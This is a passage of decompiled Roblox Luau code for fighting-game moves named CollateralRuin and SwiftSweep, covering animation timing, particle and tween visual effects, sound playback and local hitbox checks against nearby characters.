                                local _BodyVelocity9 = Instance.new('BodyVelocity')

                                _BodyVelocity9.Name = 'dodgevelocity'
                                _BodyVelocity9.MaxForce = Vector3.new(50000, 0, 50000)
                                _BodyVelocity9.Velocity = CFrame.new(u2522.Position, u2522.Position + u2522.CFrame.lookVector * Vector3.new(1, 0, 1)).lookVector * u2523
                                _BodyVelocity9.Parent = u2522

                                game.Debris:AddItem(_BodyVelocity9, 2)
                                os.clock()

                                local u2525 = nil

                                u2525 = shared.loop(function()
                                    if _BodyVelocity9 and _BodyVelocity9.Parent then
                                        _BodyVelocity9.Velocity = CFrame.new(u2522.Position, u2522.Position + u2522.CFrame.lookVector * Vector3.new(1, 0, 1)).lookVector * u2523
                                    else
                                        u2525()

                                        if _BodyVelocity9 and _BodyVelocity9.Parent then
                                            _BodyVelocity9:Destroy()
                                        end
                                    end
                                end)

                                wait(0.6)
                                u2507({
                                    Char = u201(),
                                    Spin = true,
                                    Victim = p2320,
                                })
                            end)
                        end
                        local function u2661()
                            u134()
                            u122()

                            local u2527 = u706(u1077.CollateralRuin, true)

                            u2527.Stopped:Connect(u140)
                            shared.sfx({
                                SoundId = 'rbxassetid://74376324560435',
                                Parent = u113(),
                                Volume = 4,
                            }):Play()

                            local function u2637(p2528)
                                local _char2 = p2528.char
                                local _Collat = game.ReplicatedStorage.Resources.Collat
                                local _timeScale = p2528.timeScale
                                local v2532 = {}
                                local _seed = p2528.seed

                                if p2528.explode then
                                    task.delay(0, function()
                                        local v2534, v2535, v2536 = pairs(_char2.HumanoidRootPart['Spin' .. _seed]:GetDescendants())

                                        while true do
                                            local v2537

                                            v2536, v2537 = v2534(v2535, v2536)

                                            if v2536 == nil then
                                                break
                                            end
                                            if v2537:IsA('ParticleEmitter') then
                                                v2537.Enabled = false
                                            end
                                        end

                                        local _Thrown3 = workspace.Thrown
                                        local u2539 = _Collat.ExplosionCharged:Clone()

                                        task.delay(5, function()
                                            u2539:Destroy()
                                        end)

                                        local _Wind = u2539.Wind

                                        u10:Create(_Wind, TweenInfo.new(3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                            Orientation = _Wind.Orientation + Vector3.new(0, 100, 0, 0),
                                        }):Play()

                                        local _PointLight2 = u2539.RootPos.Attachment.PointLight

                                        _PointLight2.Enabled = true

                                        u10:Create(_PointLight2, TweenInfo.new(0.8, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                            Brightness = 0,
                                            Range = 20,
                                        }):Play()
                                        task.spawn(function()
                                            local _Decal29 = u2539.Floor.Decal

                                            _Decal29.Transparency = 0

                                            task.wait(0.1)
                                            u10:Create(_Decal29, TweenInfo.new(0.85, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                                Color3 = Color3.fromRGB(0, 0, 0),
                                            }):Play()
                                            task.wait(0.5)
                                            u10:Create(_Decal29, TweenInfo.new(2, Enum.EasingStyle.Quint, Enum.EasingDirection.In), {Transparency = 1}):Play()
                                        end)

                                        local v2543 = u2539
                                        local v2544, v2545, v2546 = pairs(u2539.GetDescendants(v2543))
                                        local u2547 = u2539

                                        while true do
                                            local v2548

                                            v2546, v2548 = v2544(v2545, v2546)

                                            if v2546 == nil then
                                                break
                                            end
                                            if v2548:IsA('ParticleEmitter') then
                                                v2548:Emit(v2548:GetAttribute('EmitCount'))
                                            end
                                        end

                                        u2547:SetPrimaryPartCFrame(_char2.HumanoidRootPart.CFrame)

                                        u2547.Parent = _Thrown3

                                        task.spawn(function()
                                            local _Beams = u2547.Beams
                                            local _RedDots = u2547.RedDots
                                            local _BigRed = u2547.BigRed
                                            local v2552, v2553, v2554 = pairs(_Beams:GetDescendants())

                                            while true do
                                                local u2555

                                                v2554, u2555 = v2552(v2553, v2554)

                                                if v2554 == nil then
                                                    break
                                                end
                                                if u2555:IsA('Beam') then
                                                    u2555.Enabled = true
                                                    u2555.TextureSpeed = u2555.TextureSpeed * Random.new():NextNumber(2, 2.5)

                                                    task.delay(0.065, function()
                                                        u10:Create(u2555, TweenInfo.new(2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                                            TextureSpeed = -0.2,
                                                        }):Play()
                                                        u10:Create(u2555, TweenInfo.new(2, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Brightness = 0}):Play()
                                                    end)
                                                end
                                            end

                                            local v2556, v2557, v2558 = pairs(_RedDots:GetDescendants())

                                            while true do
                                                local u2559

                                                v2558, u2559 = v2556(v2557, v2558)

                                                if v2558 == nil then
                                                    break
                                                end
                                                if u2559:IsA('Beam') then
                                                    u2559.Enabled = true
                                                    u2559.TextureSpeed = u2559.TextureSpeed * Random.new():NextNumber(2, 2.25)

                                                    u10:Create(u2559, TweenInfo.new(2.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                                        TextureSpeed = -0.5,
                                                    }):Play()
                                                    task.delay(1.5, function()
                                                        u10:Create(u2559, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {
                                                            Brightness = 0,
                                                            LightEmission = 1,
                                                        }):Play()
                                                    end)
                                                end
                                            end

                                            local v2560, v2561, v2562 = pairs(_BigRed:GetDescendants())

                                            while true do
                                                local u2563

                                                v2562, u2563 = v2560(v2561, v2562)

                                                if v2562 == nil then
                                                    break
                                                end
                                                if u2563:IsA('Beam') then
                                                    u2563.Enabled = true
                                                    u2563.TextureSpeed = u2563.TextureSpeed * Random.new():NextNumber(1.2, 1.6)

                                                    u10:Create(u2563, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                                        TextureSpeed = -1,
                                                        Width1 = 70,
                                                    }):Play()
                                                    task.delay(0.6, function()
                                                        u10:Create(u2563, TweenInfo.new(0.4, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {
                                                            Brightness = 0,
                                                            LightEmission = 1,
                                                        }):Play()
                                                    end)
                                                end
                                            end
                                        end)
                                    end)
                                else
                                    local _anim = p2528.anim
                                    local v2565, v2566, v2567 = pairs(_Collat:GetChildren())
                                    local v2568 = {}

                                    while true do
                                        local v2569, v2570 = v2565(v2566, v2567)

                                        if v2569 == nil then
                                            break
                                        end

                                        v2567 = v2569

                                        if v2570:IsA('Part') then
                                            local v2571 = _char2:FindFirstChild(v2570.Name)

                                            if v2571 then
                                                if not v2568[v2571.Name] then
                                                    v2568[v2571.Name] = {}
                                                end

                                                local v2572, v2573, v2574 = pairs(v2570:GetChildren())

                                                while true do
                                                    local v2575

                                                    v2574, v2575 = v2572(v2573, v2574)

                                                    if v2574 == nil then
                                                        break
                                                    end

                                                    local v2576 = v2575:Clone()

                                                    v2576.Name = v2576.Name .. _seed
                                                    v2576.Parent = v2571

                                                    table.insert(v2532, v2576)

                                                    v2568[v2571.Name][v2576.Name] = v2575
                                                end
                                            end
                                        end
                                    end

                                    local u2577 = v2532
                                    local u2578 = v2568

                                    task.delay(6, function()
                                        local v2579, v2580, v2581 = pairs(u2577)

                                        while true do
                                            local u2582

                                            v2581, u2582 = v2579(v2580, v2581)

                                            if v2581 == nil then
                                                break
                                            end

                                            pcall(function()
                                                u2582:Destroy()
                                            end)
                                        end

                                        table.clear(u2577)
                                        table.clear(u2578)
                                    end)

                                    local u2583 = _char2
                                    local u2584 = _seed

                                    table.insert(v2532, _anim.Stopped:Connect(function()
                                        local v2585, v2586, v2587 = pairs(u2583.HumanoidRootPart['Spin' .. u2584]:GetDescendants())

                                        while true do
                                            local v2588

                                            v2587, v2588 = v2585(v2586, v2587)

                                            if v2587 == nil then
                                                break
                                            end
                                            if v2588:IsA('ParticleEmitter') then
                                                v2588.Enabled = false
                                            end
                                        end
                                    end))

                                    local u2589 = _Collat

                                    task.delay(0.48, function()
                                        local v2590, v2591, v2592 = pairs(u2583.HumanoidRootPart['WindupEmit' .. u2584]:GetDescendants())

                                        while true do
                                            local v2593, v2594 = v2590(v2591, v2592)

                                            if v2593 == nil then
                                                break
                                            end

                                            v2592 = v2593

                                            if v2594:IsA('ParticleEmitter') then
                                                v2594:Emit(v2594:GetAttribute('EmitCount'))
                                            end
                                        end

                                        local _ = u2589.CollateralFX
                                        local _Thrown4 = workspace.Thrown

                                        task.spawn(function()
                                            local function v2600()
                                                local v2596, v2597, v2598 = pairs(u2583.Torso['TorsoWindup' .. u2584]:GetDescendants())

                                                while true do
                                                    local v2599

                                                    v2598, v2599 = v2596(v2597, v2598)

                                                    if v2598 == nil then
                                                        break
                                                    end
                                                    if v2599:IsA('ParticleEmitter') then
                                                        v2599:Emit(v2599:GetAttribute('EmitCount'))
                                                    end
                                                end
                                            end

                                            v2600()
                                            task.wait(0.07)
                                            v2600()
                                            task.wait(0.07)
                                            v2600()
                                            task.wait(0.07)
                                        end)

                                        local u2601 = u2589.WindupWind:Clone()

                                        u2601:PivotTo(u2583.PrimaryPart.CFrame * CFrame.new(0, 0, -0.000122070312, 1, 4.41075736e-6, -1.19208789e-6, -4.41075235e-6, 1, 3.9339165599999997e-6, 1.19210517e-6, -3.93391065e-6, 1))

                                        u2601.Parent = workspace.Thrown

                                        local v2602, v2603, v2604 = pairs(u2601:GetDescendants())

                                        while true do
                                            local v2605

                                            v2604, v2605 = v2602(v2603, v2604)

                                            if v2604 == nil then
                                                break
                                            end
                                            if v2605:IsA('ParticleEmitter') then
                                                v2605:Emit(v2605:GetAttribute('EmitCount'))
                                            end
                                        end

                                        task.spawn(function()
                                            local _Wind2 = u2601.Wind

                                            u10:Create(_Wind2, TweenInfo.new(1.6, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                                Orientation = _Wind2.Orientation + Vector3.new(0, -180, 0, 0),
                                            }):Play()
                                        end)
                                        u2601:SetPrimaryPartCFrame(u2583.HumanoidRootPart.CFrame)

                                        u2601.Parent = _Thrown4

                                        task.delay(5, function()
                                            u2601:Destroy()
                                        end)
                                        task.spawn(function()
                                            local _Start18 = u2601.WindWave.Start
                                            local _End18 = u2601.WindWave.End

                                            _Start18.Decal.Transparency = 0.72

                                            u10:Create(_Start18, TweenInfo.new(0.85, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                CFrame = _End18.CFrame,
                                            }):Play()
                                            u10:Create(_Start18.Mesh, TweenInfo.new(0.85, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                                Scale = _End18.Mesh.Scale,
                                            }):Play()
                                            u10:Create(_Start18.Decal, TweenInfo.new(0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                        end)
                                        task.spawn(function()
                                            local _Start19 = u2601.WindPillar.Start
                                            local _End19 = u2601.WindPillar.End

                                            _Start19.Decal.Transparency = 0.72

                                            u10:Create(_Start19, TweenInfo.new(0.75, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                                CFrame = _End19.CFrame,
                                            }):Play()
                                            u10:Create(_Start19.Mesh, TweenInfo.new(0.75, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                                Scale = _End19.Mesh.Scale,
                                            }):Play()
                                            u10:Create(_Start19.Decal, TweenInfo.new(0.75, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                        end)
                                    end)
                                    task.delay(0.65, function()
                                        local v2611, v2612, v2613 = pairs(u2583['Left Arm']['WindupGlow' .. u2584]:GetDescendants())

                                        while true do
                                            local v2614

                                            v2613, v2614 = v2611(v2612, v2613)

                                            if v2613 == nil then
                                                break
                                            end
                                            if v2614:IsA('ParticleEmitter') then
                                                v2614.Enabled = true
                                            end
                                        end

                                        local v2615, v2616, v2617 = pairs(u2583.HumanoidRootPart['WindupRings' .. u2584]:GetDescendants())

                                        while true do
                                            local v2618

                                            v2617, v2618 = v2615(v2616, v2617)

                                            if v2617 == nil then
                                                break
                                            end
                                            if v2618:IsA('ParticleEmitter') then
                                                v2618.Enabled = true
                                            end
                                        end
                                    end)

                                    local u2619 = _timeScale
                                    local u2620 = _anim

                                    task.delay(1.11, function()
                                        if u2620 and u2620.IsPlaying then
                                            local v2621, v2622, v2623 = pairs(u2583.HumanoidRootPart['Spin' .. u2584]:GetDescendants())

                                            while true do
                                                local v2624

                                                v2623, v2624 = v2621(v2622, v2623)

                                                if v2623 == nil then
                                                    break
                                                end
                                                if v2624:IsA('ParticleEmitter') then
                                                    v2624.Enabled = true
                                                end
                                            end

                                            table.insert(u2577, u2619:GetPropertyChangedSignal('Value'):Connect(function()
                                                local v2625, v2626, v2627 = pairs(u2583.HumanoidRootPart['Spin' .. u2584]:GetDescendants())

                                                while true do
                                                    local v2628

                                                    v2627, v2628 = v2625(v2626, v2627)

                                                    if v2627 == nil then
                                                        break
                                                    end
                                                    if v2628:IsA('ParticleEmitter') then
                                                        v2628.TimeScale = u2619.Value
                                                    end
                                                end
                                            end))
                                        end

                                        local v2629, v2630, v2631 = pairs(u2583['Left Arm']['WindupGlow' .. u2584]:GetDescendants())

                                        while true do
                                            local v2632

                                            v2631, v2632 = v2629(v2630, v2631)

                                            if v2631 == nil then
                                                break
                                            end
                                            if v2632:IsA('ParticleEmitter') then
                                                v2632.Enabled = false
                                            end
                                        end

                                        local v2633, v2634, v2635 = pairs(u2583.HumanoidRootPart['WindupRings' .. u2584]:GetDescendants())

                                        while true do
                                            local v2636

                                            v2635, v2636 = v2633(v2634, v2635)

                                            if v2635 == nil then
                                                break
                                            end
                                            if v2636:IsA('ParticleEmitter') then
                                                v2636.Enabled = false
                                            end
                                        end
                                    end)
                                end
                            end

                            u2527.Stopped:Connect(u131)

                            local _NumberValue = Instance.new('NumberValue')

                            _NumberValue.Value = 1
                            _NumberValue.Parent = u201()

                            local u2639 = math.random(1, 9999999)

                            u2637({
                                timeScale = _NumberValue,
                                char = u201(),
                                seed = u2639,
                                anim = u2527,
                            })

                            local v2640 = u2527

                            u2527.GetMarkerReachedSignal(v2640, 'DownMesh'):Connect(function()
                                shared.addshake(9)
                                shared.sfx({
                                    SoundId = 'rbxassetid://72000489811842',
                                    Parent = u113(),
                                    Volume = 7,
                                }):Play()
                                u2637({
                                    timeScale = _NumberValue,
                                    char = u201(),
                                    seed = u2639,
                                    explode = true,
                                    anim = u2527,
                                })
                            end)

                            local v2641 = u2527

                            u2527.GetMarkerReachedSignal(v2641, 'StartHitbox'):Connect(function()
                                u357({
                                    Intensity = 4,
                                    Last = 2,
                                })

                                local v2642, v2643, v2644 = pairs(_LocalPlayer3.Character.Parent:GetChildren())
                                local u2645 = false

                                while true do
                                    local u2646

                                    v2644, u2646 = v2642(v2643, v2644)

                                    if v2644 == nil then
                                        break
                                    end

                                    local _, v2660 = pcall(function()
                                        if u2646 ~= _LocalPlayer3.Character and (u2646.Humanoid:GetState() ~= Enum.HumanoidStateType.Dead and (u2646.HumanoidRootPart.Position - _LocalPlayer3.Character.HumanoidRootPart.Position).Magnitude <= 25) then
                                            if not u2645 then
                                                u2645 = true

                                                u357({Intensity = 9})
                                            end

                                            shared.sfx({
                                                SoundId = 'rbxassetid://17173355584',
                                                Parent = u113(),
                                                Volume = 3,
                                            }):Play()
                                            shared.sfx({
                                                SoundId = 'rbxassetid://17173354974',
                                                Parent = u113(),
                                                Volume = 2.5,
                                            }):Play()
                                            shared.sfx({
                                                SoundId = 'rbxassetid://17325675161',
                                                Parent = u113(),
                                                Volume = 3.5,
                                            }):Play()

                                            local v2647 = {
                                                Char = _LocalPlayer3.Character,
                                                hit = u2646,
                                                tim = 0.36,
                                            }
                                            local _ = v2647.Char
                                            local v2648 = {}
                                            local _, _ = u745(game.ReplicatedStorage.Resources.KJEffects, v2648, 15)
                                            local _hit = v2647.hit
                                            local u2650 = game.ReplicatedStorage.Resources.KJEffects.ImpactEffect.Attachment:Clone()

                                            table.insert(v2648, u2650)

                                            u2650.Parent = _hit.PrimaryPart

                                            local v2651, v2652, v2653 = pairs(u2650:GetChildren())

                                            while true do
                                                local v2654

                                                v2653, v2654 = v2651(v2652, v2653)

                                                if v2653 == nil then
                                                    break
                                                end
                                                if v2654:IsA('ParticleEmitter') then
                                                    v2654:Emit(v2654:GetAttribute('EmitCount'))

                                                    v2654.TimeScale = 0.075

                                                    u10:Create(v2654, TweenInfo.new(0.347, Enum.EasingStyle.Linear), {TimeScale = 0.001}):Play()
                                                end
                                            end

                                            task.delay(v2647.tim, function()
                                                local v2655 = u2650
                                                local v2656, v2657, v2658 = pairs(v2655:GetChildren())

                                                while true do
                                                    local v2659

                                                    v2658, v2659 = v2656(v2657, v2658)

                                                    if v2658 == nil then
                                                        break
                                                    end
                                                    if v2659:IsA('ParticleEmitter') then
                                                        v2659.TimeScale = 1
                                                    end
                                                end
                                            end)
                                            u2527:AdjustSpeed(0)
                                            task.delay(0.5, function()
                                                u2527:AdjustSpeed(1)

                                                u2527.TimePosition = 1.46
                                            end)
                                        end
                                    end)

                                    if v2660 then
                                        u18(v2660)
                                    end
                                end
                            end)
                        end
                        local function u2744()
                            u122()
                            u134()

                            local u2662 = false
                            local v2663 = u706(u1077.SwiftSweep.Startup, true)

                            v2663.Stopped:Connect(function()
                                if not u2662 then
                                    u131()
                                    u140()
                                end
                            end)
                            shared.sfx({
                                SoundId = 'rbxassetid://16944636115',
                                Parent = u113(),
                                Volume = 1,
                            }):Play()

                            local function u2683(p2664, p2665, p2666)
                                local v2667, v2668, v2669 = pairs(p2664:GetChildren())
                                local u2670 = {}

                                while true do
                                    local v2671

                                    v2669, v2671 = v2667(v2668, v2669)

                                    if v2669 == nil then
                                        break
                                    end

                                    u2670[v2671.Name] = v2671
                                end

                                local u2674 = setmetatable({}, {
                                    __index = function(_, p2672)
                                        return {
                                            Clone = function(_)
                                                local v2673 = rawget(u2670, p2672):Clone()

                                                if not table.find(p2665, v2673) then
                                                    table.insert(p2665, v2673)
                                                end

                                                return v2673
                                            end,
                                        }
                                    end,
                                })
                                local u2675 = {_maid = {}}

                                function u2675._maid.give(_, p2676)
                                    if not table.find(p2665, p2676) then
                                        table.insert(p2665, p2676)
                                    end

                                    return p2676
                                end
                                function u2675._maid.giveTask(_, p2677)
                                    if not table.find(p2665, p2677) then
                                        table.insert(p2665, p2677)
                                    end

                                    return p2677
                                end

                                local function v2682()
                                    if u2674 and u2675 then
                                        table.clear(u2674)
                                        table.clear(u2675)
                                    end
                                    if u2670 then
                                        table.clear(u2670)

                                        u2670 = nil
                                    end

                                    u2675 = nil
                                    u2674 = nil

                                    if p2665 then
                                        local v2678, v2679, v2680 = pairs(p2665)

                                        while true do
                                            local v2681

                                            v2680, v2681 = v2678(v2679, v2680)

                                            if v2680 == nil then
                                                break
                                            end
                                            if typeof(v2681) ~= 'RBXScriptConnection' then
                                                if typeof(v2681) == 'Instance' then
                                                    v2681:Destroy()
                                                end
                                            else
                                                v2681:Disconnect()
                                            end

                                            p2665[v2680] = nil
                                        end

                                        table.clear(p2665)
                                    end

                                    p2665 = nil
                                end

                                task.delay(p2666 or 10, v2682)

                                return u2674, u2675, v2682
                            end

                            local u2684 = {}
                            local v2685 = {
                                Length = 0.383,
                                CF = {
                                    {
                                        Time = 0,
                                        Value = CFrame.new(-0.4329986572265625, -0.7049999237060547, -0.173004150390625) * CFrame.Angles(-2.931734264329995, 0.7261442352922407, -0.56327010949613),
                                    },
                                    {
                                        Time = 0.05,
                                        Value = CFrame.new(-0.4329986572265625, -0.7049999237060547, -0.173004150390625) * CFrame.Angles(-2.931734264329995, 0.7261442352922407, -0.56327010949613),
                                    },
                                    {
                                        Time = 0.25,
                                        Value = CFrame.new(-0.4329986572265625, -0.7049999237060547, -0.173004150390625) * CFrame.Angles(0.37625808014493756, -0.8867843396457988, -2.6789756820561763),
                                    },
                                    {
                                        Time = 0.383,
                                        Value = CFrame.new(-0.4329986572265625, -0.7049999237060547, -0.173004150390625) * CFrame.Angles(-2.5432239728360573, 1.085315542060154, -0.6489657757690516),
                                    },
                                },
                                Transparency = {
                                    {
                                        Time = 0,
                                        Value = 1,
                                    },
                                    {
                                        Time = 0.35,
                                        Value = 0.5,
                                    },
                                    {
                                        Time = 0.383,
                                        Value = 1,
                                    },
                                },
                            }

                            u2684.FollowUpKick = v2685

                            local function u2705(p2686, p2687, p2688, p2689)
                                local v2690 = u2684[p2687]
                                local u2691 = p2689:Clone()

                                u2691.Parent = workspace.Thrown
                                u2691:WaitForChild('Weld').Part0 = p2686:WaitForChild('HumanoidRootPart')
                                u2691.Decal.Transparency = 1
                                u2691.Weld.C0 = v2690.CF[1].Value

                                local v2692, v2693, v2694 = pairs(v2690.CF)
                                local u2695 = p2688 or 1

                                while true do
                                    local u2696

                                    v2694, u2696 = v2692(v2693, v2694)

                                    if v2694 == nil then
                                        break
                                    end

                                    local u2697 = u2696.Time - (v2690.CF[v2694 - 1] and (v2690.CF[v2694 - 1].Time or 0) or 0)
                                    local v2698 = v2690.CF[v2694 - 1] and (v2690.CF[v2694 - 1].Time or 0) or 0

                                    task.delay(v2698 / u2695, function()
                                        u10:Create(u2691.Weld, TweenInfo.new(u2697 / u2695, Enum.EasingStyle.Linear), {
                                            C0 = u2696.Value,
                                        }):Play()
                                    end)
                                end

                                local v2699, v2700, v2701 = pairs(v2690.Transparency)

                                while true do
                                    local u2702

                                    v2701, u2702 = v2699(v2700, v2701)

                                    if v2701 == nil then
                                        break
                                    end

                                    local u2703 = u2702.Time - (v2690.Transparency[v2701 - 1] and (v2690.Transparency[v2701 - 1].Time or 0) or 0)
                                    local v2704 = v2690.Transparency[v2701 - 1] and (v2690.Transparency[v2701 - 1].Time or 0) or 0

                                    task.delay(v2704 / u2695, function()
                                        u10:Create(u2691.Decal, TweenInfo.new(u2703 / u2695, Enum.EasingStyle.Linear), {
                                            Transparency = u2702.Value,
                                        }):Play()
                                    end)
                                end

                                task.delay(v2690.Length / u2695, function()
                                    u2691:Destroy()
                                end)
                            end

                            v2663:GetMarkerReachedSignal('Hitbox'):Connect(function()
                                local v2706 = Vector3.new(7, 7, 7)
                                local v2707 = DoHitbox({}, u201(), v2706, u113().CFrame + u113().CFrame.LookVector * v2706.Z * 0.75)

                                if v2707 and #v2707 > 0 then
                                    local v2708, v2709, v2710 = pairs(v2707)
                                    local v2711, _ = v2708(v2709, v2710)

                                    if v2711 ~= nil then
                                        if u2662 then
                                            return
                                        else
                                            u2662 = true

                                            u357({Intensity = 2})

                                            local v2712, v2713, v2714 = pairs(_LocalPlayer3.Character.Humanoid.Animator:GetPlayingAnimationTracks())

                                            while true do
                                                local v2715

                                                v2714, v2715 = v2712(v2713, v2714)

                                                if v2714 == nil then
                                                    break
                                                end

                                                v2715:Stop()
                                            end

                                            shared.sfx({
                                                SoundId = 'rbxassetid://16944654440',
                                                Parent = u113(),
                                                Volume = 1,
                                            }):Play()

                                            local v2716 = u706(u1077.SwiftSweep.Attacker, true)

                                            v2716.Stopped:Connect(u131)
                                            v2716.Stopped:Connect(u140)
                                            v2716:GetMarkerReachedSignal('Hit'):Connect(function()
                                                local v2717 = Vector3.new(7, 7, 7)
                                                local v2718 = DoHitbox({}, u201(), v2717, u113().CFrame + u113().CFrame.LookVector * v2717.Z * 0.75)

                                                if v2718 and #v2718 > 0 then
                                                    u357({Intensity = 3})

                                                    local v2719, v2720, v2721 = pairs(v2718)

                                                    while true do
                                                        local v2722

                                                        v2721, v2722 = v2719(v2720, v2721)

                                                        if v2721 == nil then
                                                            break
                                                        end

                                                        shared.sfx({
                                                            SoundId = 'rbxassetid://16944676794',
                                                            Parent = u113(),
                                                            Volume = 1,
                                                        }):Play()
                                                        shared.sfx({
                                                            SoundId = 'rbxassetid://16944654157',
                                                            Parent = u113(),
                                                            Volume = 1,
                                                        }):Play()

                                                        local v2723 = {
                                                            CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame,
                                                            Origin = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3),
                                                        }
                                                        local u2724 = game.ReplicatedStorage.Resources.Ring:Clone()

                                                        task.delay(v2723.Time or 0.3, function()
                                                            u2724:Destroy()
                                                        end)

                                                        if v2723.Look then
                                                            v2723.CFrame = v2723.Look.CFrame
                                                            v2723.Origin = v2723.Look.CFrame + v2723.Look.CFrame.lookVector

                                                            if v2723.Forward then
                                                                v2723.CFrame = v2723.CFrame + v2723.Look.CFrame.lookVector * v2723.Forward
                                                            end
                                                        end
                                                        if v2723.Color then
                                                            u2724.Color = v2723.Color
                                                        end

                                                        u2724.Transparency = v2723.Transparency or 0
                                                        u2724.Size = Vector3.new(v2723.Size or 2.589, v2723.Initial or 0.896, v2723.Size or 2.589)
                                                        u2724.CFrame = CFrame.new(v2723.CFrame.p, v2723.Part and v2723.Part.CFrame.p or v2723.Origin.p) * CFrame.Angles(1.5707963267948966, 0, 0)
                                                        u2724.Parent = workspace.Thrown

                                                        if not v2723.Add then
                                                            v2723.Add = 1
                                                        end

                                                        local v2725 = {
                                                            Size = Vector3.new(9.874 * v2723.Add, v2723.NoScaleY and (u2724.Size.Y or 0.1) or 0.1, 9.874 * v2723.Add),
                                                            Transparency = 1,
                                                        }

                                                        if v2723.Down then
                                                            v2725.Position = u2724.Position + v2723.Down
                                                        end

                                                        u10:Create(u2724, TweenInfo.new(v2723.Time or 0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), v2725):Play()
                                                    end
                                                end
                                            end)

                                            local v2726 = {
                                                Hit = true,
                                                Character = _LocalPlayer3.Character,
                                            }
                                            local _Character5 = v2726.Character
                                            local _ = _Character5.PrimaryPart
                                            local u2728 = {}
                                            local u2729, _ = u2683(game.ReplicatedStorage.Resources.KJEffects, u2728, 5)

                                            if v2726.Hit then
                                                local v2730 = u2729.FollowUpCresc:Clone()
                                                local v2731 = u2729.SweepHitMesh:Clone()

                                                v2731.CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(2.16400146484375, -2.9619998931884766, -4.4180297851562) * CFrame.Angles(0, 0, -1.5707963267948966)
                                                v2731.Parent = workspace.Thrown

                                                u10:Create(v2731.Mesh, TweenInfo.new(0.133, Enum.EasingStyle.Linear), {
                                                    Scale = Vector3.new(0, 20, 0, 0),
                                                }):Play()
                                                u10:Create(v2731, TweenInfo.new(0.133, Enum.EasingStyle.Linear), {
                                                    CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(0.5640029907226563, -2.9619998931884766, -4.41802978515625) * CFrame.Angles(0, 0, -1.5707963267948966),
                                                }):Play()
                                                task.delay(0.083, function()
                                                    local v2732 = game.ReplicatedStorage.Resources.KJEffects.LegSweepHit.Hit:Clone()

                                                    table.insert(u2728, v2732)

                                                    v2732.Parent = _Character5.HumanoidRootPart

                                                    v2732['15']:Emit(v2732['15'].Name)
                                                    u6:AddItem(v2732, 0.5)
                                                end)
                                                u2705(_Character5, 'FollowUpKick', 1, v2730)
                                            else
                                                local u2733 = u2729.SweepCresc:Clone()

                                                u2733.CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 0.6981317007977318, 3.141592653589793)
                                                u2733.Parent = workspace.Thrown

                                                u10:Create(u2733.Decal, TweenInfo.new(0.133, Enum.EasingStyle.Linear), {Transparency = 0.8}):Play()
                                                task.delay(0.133, function()
                                                    u10:Create(u2733.Decal, TweenInfo.new(0.217, Enum.EasingStyle.Linear), {Transparency = 1}):Play()
                                                end)
                                                u10:Create(u2733, TweenInfo.new(0.183, Enum.EasingStyle.Linear), {
                                                    CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 2.6179938779914944, 3.141592653589793),
                                                }):Play()
                                                task.delay(0.183, function()
                                                    u10:Create(u2733, TweenInfo.new(0.167, Enum.EasingStyle.Linear), {
                                                        CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 4.886921905584122, 3.141592653589793),
                                                    }):Play()
                                                end)
                                                task.delay(0.033, function()
                                                    local u2734 = u2729.particlespinner:Clone()

                                                    u2734.CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(0, -3, 0) * CFrame.Angles(0, 0.1484577061746377, 0)
                                                    u2734.Parent = workspace.Thrown
                                                    u2734.Attachment.ParticleEmitter.Enabled = true
                                                    u2734.Attachment.rocks.Enabled = true

                                                    u10:Create(u2734, TweenInfo.new(0.167, Enum.EasingStyle.Linear), {
                                                        CFrame = _Character5.HumanoidRootPart.CFrame * CFrame.new(0, -2.632, 0) * CFrame.Angles(0, 2.9670597283903604, 0),
                                                    }):Play()
                                                    task.delay(0.167, function()
                                                        u2734.Attachment.ParticleEmitter.Enabled = false
                                                        u2734.Attachment.rocks.Enabled = false

                                                        u6:AddItem(u2734, 9)
                                                    end)
                                                end)
                                            end
                                        end
                                    end
                                end
                            end)
                            v2663:GetMarkerReachedSignal('StartSweepEffects'):Connect(function()
                                local v2735 = {
                                    Hit = false,
                                    Character = _LocalPlayer3.Character,
                                }
                                local _Character6 = v2735.Character
                                local _ = _Character6.PrimaryPart
                                local u2737 = {}
                                local u2738, _ = u2683(game.ReplicatedStorage.Resources.KJEffects, u2737, 5)

                                if v2735.Hit then
                                    local v2739 = u2738.FollowUpCresc:Clone()
                                    local v2740 = u2738.SweepHitMesh:Clone()

                                    v2740.CFrame = _Character6.HumanoidRootPart.CFrame * CFrame.new(2.16400146484375, -2.9619998931884766, -4.4180297851562) * CFrame.Angles(0, 0, -1.5707963267948966)
                                    v2740.Parent = workspace.Thrown

                                    u10:Create(v2740.Mesh, TweenInfo.new(0.133, Enum.EasingStyle.Linear), {
                                        Scale = Vector3.new(0, 20, 0, 0),
                                    }):Play()
                                    u10:Create(v2740, TweenInfo.new(0.133, Enum.EasingStyle.Linear), {
